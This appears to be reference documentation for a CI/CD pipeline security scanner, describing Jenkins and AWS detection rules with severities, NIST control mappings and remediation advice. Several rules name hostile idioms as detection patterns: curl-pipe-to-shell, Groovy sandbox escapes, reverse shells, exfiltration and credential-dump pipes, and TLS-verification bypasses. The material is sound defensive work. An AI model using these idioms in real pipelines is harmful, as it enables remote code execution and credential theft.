#### `IAM-008`: OIDC-federated role trust policy missing audience or subject pin <span class="pg-sev pg-sev--high">HIGH</span> { #detail-iam-008 }

**Evidences:** [`PR.AA-03`](#ctrl-pr-aa-03) Users, services, and hardware are authenticated.

**How this is detected.** IAM-005 already covers cross-account AWS principals. This rule targets the OIDC federation path specifically because the blast radius of a missed audience/subject pin is the entire identity provider's tenant base (e.g. all GitHub users, not just your org).

**Recommendation.** Every Allow statement that trusts a federated OIDC provider (``token.actions.githubusercontent.com``, GitLab, CircleCI, Terraform Cloud, etc.) must pin both the audience (``...:aud = sts.amazonaws.com``) and a subject prefix (``...:sub`` matching ``repo:myorg/*``). Without these, any workflow from any tenant can assume the role.

**Source:** [`IAM-008`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `JF-001`: Shared library not pinned to a tag or commit <span class="pg-sev pg-sev--high">HIGH</span> { #detail-jf-001 }

**Evidences:** [`GV.SC-05`](#ctrl-gv-sc-05) Requirements to address cybersecurity risks in supply chains are established, prioritized, and integrated into contracts, [`GV.SC-07`](#ctrl-gv-sc-07) Risks posed by suppliers, their products and services, are understood, recorded, prioritized, assessed, responded to, and monitored.

**How this is detected.** `@main`, `@master`, `@develop`, no-`@ref`, and any non-semver / non-SHA ref are floating. Whoever controls the upstream library can ship code into your build by pushing to that branch.

**Recommendation.** Pin every `@Library('name@<ref>')` to a release tag (e.g. `@v1.4.2`) or a 40-char commit SHA. Configure the library in Jenkins with 'Allow default version to be overridden' disabled so a pipeline can't escape the pin.

**Source:** [`JF-001`](../providers/jenkins.md#jf-001) in the [Jenkins provider](../providers/jenkins.md).

#### `JF-002`: Script step interpolates attacker-controllable env var <span class="pg-sev pg-sev--high">HIGH</span> { #detail-jf-002 }

**Evidences:** [`PR.PS-05`](#ctrl-pr-ps-05) Installation and execution of unauthorized software are prevented.

**How this is detected.** $BRANCH_NAME / $GIT_BRANCH / $TAG_NAME / $CHANGE_* are populated from SCM event metadata the attacker controls. Single-quoted Groovy strings don't interpolate so they're safe; only double-quoted / triple-double-quoted bodies are flagged.

**Recommendation.** Switch the affected `sh`/`bat`/`powershell` step to a single-quoted string (Groovy doesn't interpolate single quotes), and pass values through a quoted shell variable (`sh 'echo "$BRANCH"'` after `withEnv([...])`).

**Source:** [`JF-002`](../providers/jenkins.md#jf-002) in the [Jenkins provider](../providers/jenkins.md).

#### `JF-003`: Pipeline uses `agent any` (no executor isolation) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-jf-003 }

**Evidences:** [`PR.PS-01`](#ctrl-pr-ps-01) Configuration management practices are established and applied.

**How this is detected.** `agent any` is the broadest possible executor scope, any registered executor can be picked, including ones with broader IAM / file-system access than this build needs. A compromise of one job blast-radiates across every pool.

**Recommendation.** Replace `agent any` with `agent { label 'build-pool' }` (targeting a labeled pool) or `agent { docker { image '...' } }` (ephemeral container). Reserve broad-access agents for jobs that genuinely need them.

**Source:** [`JF-003`](../providers/jenkins.md#jf-003) in the [Jenkins provider](../providers/jenkins.md).

#### `JF-004`: AWS auth uses long-lived access keys via withCredentials <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-jf-004 }

**Evidences:** [`PR.AA-01`](#ctrl-pr-aa-01) Identities and credentials for authorized users, services, and hardware are managed.

**How this is detected.** Fires when BOTH a credentialsId containing `aws` is referenced AND an AWS key variable name appears (requires both so an OIDC role binding doesn't false-positive). Also fires when `withAWS(credentials: '…')` is used, the safe alternative is `withAWS(role: '…')`.

**Recommendation.** Switch to the AWS plugin's IAM-role / OIDC binding (e.g. `withAWS(role: 'arn:aws:iam::…:role/jenkins')`) so each build assumes a short-lived role. Remove the static AWS_ACCESS_KEY_ID secret from the Jenkins credentials store once the role is in place.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`JF-004`](../providers/jenkins.md#jf-004) in the [Jenkins provider](../providers/jenkins.md).

#### `JF-006`: Artifacts not signed <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-jf-006 }

**Evidences:** [`PR.PS-06`](#ctrl-pr-ps-06) Secure software development practices are integrated, and their performance is monitored throughout the SDLC.

**How this is detected.** Passes when cosign / sigstore / slsa-* / notation-sign appears in executable Jenkinsfile text (comments are stripped before matching).

**Recommendation.** Add a `sh 'cosign sign --yes …'` step (the cosign-installer Jenkins plugin handles binary install). Publish the signature next to the artifact and verify it at deploy.

**Source:** [`JF-006`](../providers/jenkins.md#jf-006) in the [Jenkins provider](../providers/jenkins.md).

#### `JF-007`: SBOM not produced <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-jf-007 }

**Evidences:** [`GV.SC-03`](#ctrl-gv-sc-03) Cybersecurity supply chain risk management is integrated into CS and ERM programs, [`GV.SC-04`](#ctrl-gv-sc-04) Suppliers are known and prioritized by criticality.

**How this is detected.** Passes when a direct SBOM tool token (CycloneDX, syft, anchore, spdx-sbom-generator, sbom-tool) appears in executable code, or when Trivy is paired with `sbom` / `cyclonedx` in the same file. Comments are stripped before matching.

**Recommendation.** Add a `sh 'syft . -o cyclonedx-json > sbom.json'` step (or Trivy with `--format cyclonedx`) and archive the result with `archiveArtifacts`.

**Source:** [`JF-007`](../providers/jenkins.md#jf-007) in the [Jenkins provider](../providers/jenkins.md).

#### `JF-008`: Credential-shaped literal in pipeline body <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-jf-008 }

**Evidences:** [`PR.AA-01`](#ctrl-pr-aa-01) Identities and credentials for authorized users, services, and hardware are managed.

**How this is detected.** Scans the raw Jenkinsfile text against the cross-provider credential-pattern catalog. Secrets committed to Groovy source are visible in every fork and every build log.

**Recommendation.** Rotate the exposed credential. Move the value to a Jenkins credential and reference it via `withCredentials([string(credentialsId: '…', variable: '…')])`.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Test fixtures and documentation blobs sometimes embed credential-shaped strings (JWT samples, AKIAI... examples). The AWS canonical example ``AKIAIOSFODNN7EXAMPLE`` is deliberately NOT suppressed, if it appears in a real pipeline it almost always means a copy-paste from docs was never substituted. Defaults to LOW confidence.

**Source:** [`JF-008`](../providers/jenkins.md#jf-008) in the [Jenkins provider](../providers/jenkins.md).

#### `JF-009`: Agent docker image not pinned to sha256 digest <span class="pg-sev pg-sev--high">HIGH</span> { #detail-jf-009 }

**Evidences:** [`GV.SC-05`](#ctrl-gv-sc-05) Requirements to address cybersecurity risks in supply chains are established, prioritized, and integrated into contracts.

**How this is detected.** `agent { docker { image 'name:tag' } }` is not digest-pinned, so a repointed registry tag silently swaps the executor under every subsequent build. Unlike the YAML providers, Jenkins has no separate tag-pinning check, so this one fires at HIGH regardless of whether the tag is floating or immutable.

**Recommendation.** Resolve each image to its current digest (`docker buildx imagetools inspect <ref>` prints it) and reference it via `image '<repo>@sha256:<digest>'`. Automate refreshes with Renovate.

**Source:** [`JF-009`](../providers/jenkins.md#jf-009) in the [Jenkins provider](../providers/jenkins.md).

#### `JF-010`: Long-lived AWS keys exposed via environment {} block <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-jf-010 }

**Evidences:** [`PR.AA-01`](#ctrl-pr-aa-01) Identities and credentials for authorized users, services, and hardware are managed.

**How this is detected.** Flags `environment { AWS_ACCESS_KEY_ID = '...' }` when the value is a literal or plain variable reference. Skips `credentials('id')` helpers and `${env.X}` that resolve at runtime. Matches both multiline and inline `environment { ... }` forms.

**Recommendation.** Replace the literal with a credentials-store reference: `AWS_ACCESS_KEY_ID = credentials('aws-prod-key')`. Better: switch to the AWS plugin's role binding (`withAWS(role: 'arn:…')`) so the build assumes a short-lived role per run.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`JF-010`](../providers/jenkins.md#jf-010) in the [Jenkins provider](../providers/jenkins.md).

#### `JF-011`: Pipeline has no `buildDiscarder` retention policy <span class="pg-sev pg-sev--low">LOW</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-jf-011 }

**Evidences:** [`PR.PS-04`](#ctrl-pr-ps-04) Log records are generated and made available for continuous monitoring.

**How this is detected.** Without a retention policy, build logs accumulate indefinitely; a secret that once leaked into a log stays visible to anyone who can read jobs. Recognizes declarative `options { buildDiscarder(...) }`, scripted `properties([buildDiscarder(...)])`, and bare `logRotator(...)`.

**Recommendation.** Add `options { buildDiscarder(logRotator(numToKeepStr: '30', daysToKeepStr: '90')) }` (declarative) or the `properties([buildDiscarder(...)])` equivalent in scripted pipelines. Tune the numbers to your retention policy.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`JF-011`](../providers/jenkins.md#jf-011) in the [Jenkins provider](../providers/jenkins.md).

#### `JF-012`: `load` step pulls Groovy from disk without integrity pin <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-jf-012 }

**Evidences:** [`PR.PS-05`](#ctrl-pr-ps-05) Installation and execution of unauthorized software are prevented.

**How this is detected.** `load 'foo.groovy'` evaluates whatever exists at the path when the build runs, there's no integrity check, so a workspace mutation can swap the loaded code between runs.

**Recommendation.** Move shared Groovy into a Jenkins shared library (`@Library('name@<sha>')`). Those are version-pinned and JF-001 audits them. Reserve `load` for one-off development experiments.

**Source:** [`JF-012`](../providers/jenkins.md#jf-012) in the [Jenkins provider](../providers/jenkins.md).

#### `JF-013`: copyArtifacts ingests another job's output unverified <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-jf-013 }

**Evidences:** [`PR.IR-01`](#ctrl-pr-ir-01) Networks and environments are protected from unauthorized logical access and usage.

**How this is detected.** Recognizes both `copyArtifacts(projectName: ...)` and the older `step([$class: 'CopyArtifact', ...])` form. If the upstream job accepts multibranch or PR builds, the artifact may have been produced by attacker-controlled code.

**Recommendation.** Add a verification step before consuming the artifact: `sh 'sha256sum -c manifest.sha256'` against a manifest the producer signed, or `cosign verify` over the artifact directly. Restrict the upstream job to non-PR builds via branch protection if verification isn't feasible.

**Source:** [`JF-013`](../providers/jenkins.md#jf-013) in the [Jenkins provider](../providers/jenkins.md).

#### `JF-014`: Agent label missing ephemeral marker <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-jf-014 }

**Evidences:** [`PR.PS-01`](#ctrl-pr-ps-01) Configuration management practices are established and applied.

**How this is detected.** Static Jenkins agents that persist between builds leak workspace files and process state. The check looks for an `ephemeral` substring in `agent { label '...' }` blocks.

**Recommendation.** Register Jenkins agents with ephemeral lifecycle (e.g. Kubernetes pod templates or EC2 Fleet plugin) and include `ephemeral` in the label string so the pipeline declares its expectation.

**Known false positives.**

- The check looks for the literal substring ``ephemeral`` in the agent label. Teams that use a different convention (``temp``, ``runner-pool``, org-specific ARC labels) trip the rule even when their runners are auto-scaled and ephemeral in fact. Defaults to MEDIUM confidence so CI gates can require ``--min-confidence HIGH``.

**Source:** [`JF-014`](../providers/jenkins.md#jf-014) in the [Jenkins provider](../providers/jenkins.md).

#### `JF-015`: Pipeline has no `timeout` wrapper, unbounded build <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-jf-015 }

**Evidences:** [`PR.PS-01`](#ctrl-pr-ps-01) Configuration management practices are established and applied.

**How this is detected.** Without a `timeout()` wrapper, the pipeline runs until the Jenkins controller's global timeout (or indefinitely if none is configured). Explicit timeouts cap blast radius and the window during which a compromised step has workspace access.

**Recommendation.** Wrap the pipeline body or individual stages with `timeout(time: N, unit: 'MINUTES') { … }`. Without an explicit timeout, the build runs until the Jenkins global default (or indefinitely).

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`JF-015`](../providers/jenkins.md#jf-015) in the [Jenkins provider](../providers/jenkins.md).

#### `JF-016`: Remote script piped to shell interpreter <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-jf-016 }

**Evidences:** [`PR.PS-05`](#ctrl-pr-ps-05) Installation and execution of unauthorized software are prevented.

**How this is detected.** Detects `curl | bash`, `wget | sh`, and similar patterns that pipe remote content directly into a shell interpreter inside a Jenkinsfile. An attacker who controls the remote endpoint (or poisons DNS / CDN) gains arbitrary code execution in the build agent.

**Recommendation.** Download the script to a file, verify its checksum, then execute it. Or vendor the script into the repository.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Established vendor installers (get.docker.com, sh.rustup.rs, bun.sh/install, awscli.amazonaws.com, cli.github.com, ...) ship via HTTPS from their own CDN and are idiomatic. This rule defaults to LOW confidence so CI gates can ignore them with --min-confidence MEDIUM; the finding still surfaces so teams that want cryptographic verification can audit.

**Source:** [`JF-016`](../providers/jenkins.md#jf-016) in the [Jenkins provider](../providers/jenkins.md).

#### `JF-017`: Docker run with insecure flags (privileged/host mount) <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-jf-017 }

**Evidences:** [`PR.PS-01`](#ctrl-pr-ps-01) Configuration management practices are established and applied.

**How this is detected.** Flags like `--privileged`, `--cap-add`, `--net=host`, or host-root volume mounts (`-v /:/`) in a Jenkinsfile give the container full access to the build agent, enabling container escape and lateral movement.

**Recommendation.** Remove --privileged and --cap-add flags. Use minimal volume mounts. Prefer rootless containers.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`JF-017`](../providers/jenkins.md#jf-017) in the [Jenkins provider](../providers/jenkins.md).

#### `JF-018`: Package install from insecure source <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-jf-018 }

**Evidences:** [`GV.SC-04`](#ctrl-gv-sc-04) Suppliers are known and prioritized by criticality.

**How this is detected.** Detects package-manager invocations that use plain HTTP registries (`--index-url http://`, `--registry=http://`) or disable TLS verification (`--trusted-host`, `--no-verify`) in a Jenkinsfile. These patterns allow man-in-the-middle injection of malicious packages.

**Recommendation.** Use HTTPS registry URLs. Remove --trusted-host and --no-verify flags. Pin to a private registry with TLS.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`JF-018`](../providers/jenkins.md#jf-018) in the [Jenkins provider](../providers/jenkins.md).

#### `JF-019`: Groovy sandbox escape pattern detected <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-jf-019 }

**Evidences:** [`PR.PS-05`](#ctrl-pr-ps-05) Installation and execution of unauthorized software are prevented.

**How this is detected.** Detects Groovy patterns that bypass the Jenkins script security sandbox: `Runtime.getRuntime()`, `Class.forName()`, `.classLoader`, `ProcessBuilder`, and `@Grab`. These give the pipeline (or an attacker who controls its source) unrestricted access to the Jenkins controller JVM, full RCE.

**Recommendation.** Remove direct Runtime/ClassLoader calls. Use Jenkins pipeline steps instead. Avoid @Grab for untrusted dependencies.

**Source:** [`JF-019`](../providers/jenkins.md#jf-019) in the [Jenkins provider](../providers/jenkins.md).

#### `JF-020`: No vulnerability scanning step <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-jf-020 }

**Evidences:** [`PR.PS-02`](#ctrl-pr-ps-02) Software is maintained, replaced, and removed commensurate with risk.

**How this is detected.** Without a vulnerability scanning step, known-vulnerable dependencies ship to production undetected. The check recognizes trivy, grype, snyk, npm audit, yarn audit, safety check, pip-audit, osv-scanner, and govulncheck. Comments are stripped before matching.

**Recommendation.** Add a vulnerability scanning step, trivy, grype, snyk test, npm audit, pip-audit, or osv-scanner. Publish results so vulnerabilities surface before deployment.

**Source:** [`JF-020`](../providers/jenkins.md#jf-020) in the [Jenkins provider](../providers/jenkins.md).

#### `JF-021`: Package install without lockfile enforcement <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-jf-021 }

**Evidences:** [`GV.SC-05`](#ctrl-gv-sc-05) Requirements to address cybersecurity risks in supply chains are established, prioritized, and integrated into contracts.

**How this is detected.** Detects package-manager install commands that do not enforce a lockfile or hash verification. Without lockfile enforcement the resolver pulls whatever version is currently latest, exactly the window a supply-chain attacker exploits.

**Recommendation.** Use lockfile-enforcing install commands: `npm ci` instead of `npm install`, `pip install --require-hashes -r requirements.txt`, `yarn install --frozen-lockfile`, `bundle install --frozen`, and `go install tool@v1.2.3`.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`JF-021`](../providers/jenkins.md#jf-021) in the [Jenkins provider](../providers/jenkins.md).

#### `JF-022`: Dependency update command bypasses lockfile pins <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-jf-022 }

**Evidences:** [`GV.SC-07`](#ctrl-gv-sc-07) Risks posed by suppliers, their products and services, are understood, recorded, prioritized, assessed, responded to, and monitored.

**How this is detected.** Detects `pip install --upgrade`, `npm update`, `yarn upgrade`, `bundle update`, `cargo update`, `go get -u`, and `composer update`. These commands bypass lockfile pins and pull whatever version is currently latest. Tooling upgrades (`pip install --upgrade pip`) are exempted.

**Recommendation.** Remove dependency-update commands from CI. Use lockfile-pinned install commands (`npm ci`, `pip install -r requirements.txt`) and update dependencies via a dedicated PR pipeline (e.g. Dependabot, Renovate).

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Common build-tool bootstrapping idioms (``pip install --upgrade pip``, ``pip install --upgrade setuptools wheel virtualenv``) and security-tool installs (``pip install --upgrade pip-audit / cyclonedx-bom / semgrep``) are exempted by the ``DEP_UPDATE_RE`` tooling allowlist. Other tooling-upgrade idioms not yet on the list can still trip the rule. Defaults to MEDIUM confidence so CI gates can require ``--min-confidence HIGH`` to ignore.

**Source:** [`JF-022`](../providers/jenkins.md#jf-022) in the [Jenkins provider](../providers/jenkins.md).

#### `JF-023`: TLS / certificate verification bypass <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-jf-023 }

**Evidences:** [`PR.DS-02`](#ctrl-pr-ds-02) The confidentiality, integrity, and availability of data-in-transit are protected.

**How this is detected.** Detects patterns that disable TLS certificate verification: `git config http.sslVerify false`, `NODE_TLS_REJECT_UNAUTHORIZED=0`, `npm config set strict-ssl false`, `curl -k`, `wget --no-check-certificate`, `PYTHONHTTPSVERIFY=0`, and `GOINSECURE=`. Disabling TLS verification allows MITM injection of malicious packages, repositories, or build tools.

**Recommendation.** Remove TLS verification bypasses. Fix certificate issues at the source (install CA certificates, configure proper trust stores) instead of disabling verification.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`JF-023`](../providers/jenkins.md#jf-023) in the [Jenkins provider](../providers/jenkins.md).

#### `JF-025`: Kubernetes agent pod template runs privileged or mounts hostPath <span class="pg-sev pg-sev--high">HIGH</span> { #detail-jf-025 }

**Evidences:** [`PR.PS-01`](#ctrl-pr-ps-01) Configuration management practices are established and applied.

**How this is detected.** JF-017 flags inline ``docker run`` commands. This rule targets the other privileged-mode entry point: Jenkins' Kubernetes plugin lets pipelines declare ``agent { kubernetes { yaml '''...''' } }``. A pod running with ``privileged: true`` or mounting ``hostPath: /`` gives the build container the same blast radius, container escape, node-credential theft, cross-tenant contamination on a shared cluster.

**Recommendation.** Remove ``privileged: true`` from the embedded pod YAML, drop ``hostPath``/``hostNetwork``/``hostPID``/``hostIPC`` entries, and add a ``securityContext`` with ``runAsNonRoot: true`` and a ``readOnlyRootFilesystem``. If Docker-in-Docker is genuinely required, use a rootless daemon (e.g. sysbox) or run the build on a dedicated privileged pool with stricter branch protection.

**Source:** [`JF-025`](../providers/jenkins.md#jf-025) in the [Jenkins provider](../providers/jenkins.md).

#### `JF-028`: No SLSA provenance attestation produced <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-jf-028 }

**Evidences:** [`PR.PS-06`](#ctrl-pr-ps-06) Secure software development practices are integrated, and their performance is monitored throughout the SDLC.

**How this is detected.** ``cosign sign`` signs the artifact bytes. ``cosign attest`` signs an in-toto statement describing how the build ran, builder, source commit, input parameters. SLSA L3 verifiers check the latter so consumers can enforce policy on where and how artifacts were produced.

**Recommendation.** Add a ``sh 'cosign attest --predicate=provenance.intoto.jsonl …'`` step after the build, or integrate the TestifySec ``witness run`` attestor. JF-006 covers signing; this rule covers the build-provenance statement SLSA Build L3 requires.

**Source:** [`JF-028`](../providers/jenkins.md#jf-028) in the [Jenkins provider](../providers/jenkins.md).

#### `JF-029`: Jenkinsfile contains indicators of malicious activity <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-jf-029 }

**Evidences:** [`PR.PS-05`](#ctrl-pr-ps-05) Installation and execution of unauthorized software are prevented.

**How this is detected.** Distinct from JF-016 (curl pipe) and JF-019 (Groovy sandbox escape). Those flag risky defaults; this flags concrete evidence, reverse shells, base64-decoded execution, miner binaries, exfil channels, credential-dump pipes, shell-history erasure. Runs on the comment-stripped Groovy text so ``// cosign verify … // webhook.site`` in a legitimate annotation doesn't false-positive.

**Recommendation.** Treat as a potential compromise. Identify the commit that introduced the matching stage(s), rotate Jenkins credentials the job can reach, review controller/agent audit logs for outbound traffic to the matched hosts, and re-image the agent pool if the compromise may have persisted.

**Known false positives.**

- Security-training repositories, CTF challenges, and red-team exercise pipelines legitimately contain reverse-shell strings or exfil domains as literals. Matches inside YAML keys / HCL attributes whose names contain ``example``, ``fixture``, ``sample``, ``demo``, or ``test`` are auto-suppressed; bare lines in a production pipeline still fire.
- Defaults to LOW confidence. Filter with ``--min-confidence MEDIUM`` to ignore all matches; the rule still surfaces the hit for teams that want to spot-check.

**Source:** [`JF-029`](../providers/jenkins.md#jf-029) in the [Jenkins provider](../providers/jenkins.md).

#### `JF-030`: Dangerous shell idiom (eval, sh -c variable, backtick exec) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-jf-030 }

**Evidences:** [`PR.PS-05`](#ctrl-pr-ps-05) Installation and execution of unauthorized software are prevented.

**How this is detected.** Complements JF-002 (script injection from untrusted build parameters). Fires on intrinsically risky shell idioms, ``eval``, ``sh -c "$X"``, backtick exec, regardless of whether the input source is currently trusted.

**Recommendation.** Replace ``eval "$VAR"`` / ``sh -c "$VAR"`` / backtick exec with direct command invocation. Validate any value feeding a dynamic command at the boundary, or pass arguments as a list to a real ``sh`` step so the shell is not re-invoked.

**Known false positives.**

- ``sh 'eval "$(ssh-agent -s)"'`` and similar ``eval "$(<literal-tool>)"`` bootstrap idioms are intentionally NOT flagged, the substituted command is literal, only its output is eval'd.

**Source:** [`JF-030`](../providers/jenkins.md#jf-030) in the [Jenkins provider](../providers/jenkins.md).

#### `JF-031`: Package install bypasses registry integrity (git / path / tarball source) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-jf-031 }

**Evidences:** [`GV.SC-05`](#ctrl-gv-sc-05) Requirements to address cybersecurity risks in supply chains are established, prioritized, and integrated into contracts.

**How this is detected.** Complements JF-021 (missing lockfile flag). Git URL installs without a commit pin, local-path installs, and direct tarball URLs bypass the registry integrity controls the lockfile relies on.

**Recommendation.** Pin git dependencies to a commit SHA. Publish private packages to an internal registry (Artifactory, Nexus) instead of installing from a filesystem path or tarball URL.

**Source:** [`JF-031`](../providers/jenkins.md#jf-031) in the [Jenkins provider](../providers/jenkins.md).

#### `JF-033`: withCredentials secret leaked via Groovy ${...} interpolation in sh step <span class="pg-sev pg-sev--high">HIGH</span> { #detail-jf-033 }

**Evidences:** [`PR.AA-01`](#ctrl-pr-aa-01) Identities and credentials for authorized users, services, and hardware are managed, [`PR.DS-01`](#ctrl-pr-ds-01) The confidentiality, integrity, and availability of data-at-rest are protected.

**How this is detected.** ``withCredentials([string(credentialsId: 'X', variable: 'TOKEN')])`` exposes the secret as a shell environment variable for the duration of the block. The rule fires when a ``sh`` / ``bat`` / ``powershell`` step inside that block uses a Groovy interpolation (``${TOKEN}`` or ``$TOKEN`` in a double-quoted / triple-double-quoted string) to reference the binding. Groovy substitutes the literal value before handing the resulting string to the shell, so Jenkins' secret-masking wrapper, which only sees the shell-level ``$TOKEN`` token, cannot redact the value in trace output. Single-quoted bodies (``sh '... $TOKEN'``) leave the variable for the shell to resolve at run time, which is the safe pattern.

**Recommendation.** Inside a ``withCredentials([...])`` block, reference each bound variable through the shell (single-quoted Groovy string), not through Groovy interpolation. Write ``sh 'curl -H "Authorization: Bearer $TOKEN" ...'`` instead of ``sh "curl -H 'Authorization: Bearer ${TOKEN}' ..."``. The single-quoted form keeps Jenkins' secret-masking layer in the loop, the double-quoted Groovy form bakes the literal value into the command string before the masker ever sees it, so ``set -x`` (Jenkins' default for ``sh``) prints the credential to the build log.

**Known false positives.**

- Bindings whose variable name doesn't look credential-ish (e.g. ``variable: 'COUNT'``) are still flagged: any value bound through ``withCredentials`` is a credential by definition.

**Source:** [`JF-033`](../providers/jenkins.md#jf-033) in the [Jenkins provider](../providers/jenkins.md).

#### `JF-034`: Pipeline declares a password() build parameter <span class="pg-sev pg-sev--high">HIGH</span> { #detail-jf-034 }

**Evidences:** [`PR.AA-01`](#ctrl-pr-aa-01) Identities and credentials for authorized users, services, and hardware are managed.

**How this is detected.** Jenkins' ``password()`` parameter persists the supplied value into ``builds/<n>/build.xml`` as an encrypted ``Secret``, the same encryption the Credentials Provider uses. The encryption is keyed off the controller's master key at ``$JENKINS_HOME/secrets/master.key``, so anyone who captures both the build XML and the master key (a filesystem backup, an admin running ``thinBackup``, a compromised agent that can read controller state) recovers every password every operator has ever submitted. The build's parameters page renders the value as ``********`` for Job/Read users, but Job/Configure (or higher) can recover the encrypted string from ``config.xml`` and decrypt it. The substantive operational gap vs ``withCredentials`` is log-masking: a ``sh "deploy ${params.API_TOKEN}"`` step leaks the value to the build log because the Credentials Binding plugin's masker is what intercepts that flow, and the masker only fires for ``withCredentials`` bindings, not for ``params.*`` references. ``password()`` should be treated as a deprecated anti-pattern.

**Recommendation.** Replace ``password(name: 'X')`` with a credential binding. Store the secret in Jenkins' Credentials Provider and pull it in with ``withCredentials([string(credentialsId: 'X', variable: 'X')])``. The bound variable integrates with Jenkins' log-masking, the credential definition is decoupled from build invocation (so operators don't retype the value on every trigger), and Job/Configure on the build no longer exposes the value through ``build.xml``.

**Known false positives.**

- A pipeline that intentionally uses ``password()`` for a non-secret value (e.g. a one-off prompt for a confirmation token) is still flagged, the parameter type itself is the anti-pattern. Suppress via ``.pipelinecheckignore`` with a rationale rather than disabling the rule.

**Source:** [`JF-034`](../providers/jenkins.md#jf-034) in the [Jenkins provider](../providers/jenkins.md).

#### `JF-035`: httpRequest step disables SSL verification <span class="pg-sev pg-sev--high">HIGH</span> { #detail-jf-035 }

**Evidences:** [`GV.SC-05`](#ctrl-gv-sc-05) Requirements to address cybersecurity risks in supply chains are established, prioritized, and integrated into contracts, [`PR.DS-02`](#ctrl-pr-ds-02) The confidentiality, integrity, and availability of data-in-transit are protected.

**How this is detected.** The HTTP Request plugin's ``ignoreSslErrors: true`` flag tells the step to accept any TLS certificate (including self-signed, expired, hostname-mismatched, and attacker-presented) when calling the configured URL. Pipelines that hit internal services with broken trust chains frequently reach for it as a shortcut; the runtime consequence is that whatever the response body feeds into (``readJSON``, ``writeFile``, an arg to a subsequent deploy step) is now attacker-controllable for anyone who can MITM the controller-to-service connection. Complements JF-023 (which catches the broader catalog of curl/wget/git TLS bypasses) — JF-035 is specific to the ``httpRequest`` plugin step Jenkins pipelines commonly use for API calls.

**Recommendation.** Drop ``ignoreSslErrors: true`` from the ``httpRequest`` step. Fix certificate trust at the source: install the internal CA into the controller's truststore, or use a properly-issued certificate on the upstream service. Disabling verification on a CI runner lets any actor on the network path between Jenkins and the target inject responses, including payloads that flow into downstream stages.

**Source:** [`JF-035`](../providers/jenkins.md#jf-035) in the [Jenkins provider](../providers/jenkins.md).

#### `K8S-001`: Container image not pinned by sha256 digest <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-k8s-001 }

**Evidences:** [`GV.SC-05`](#ctrl-gv-sc-05) Requirements to address cybersecurity risks in supply chains are established, prioritized, and integrated into contracts, [`PR.PS-02`](#ctrl-pr-ps-02) Software is maintained, replaced, and removed commensurate with risk.

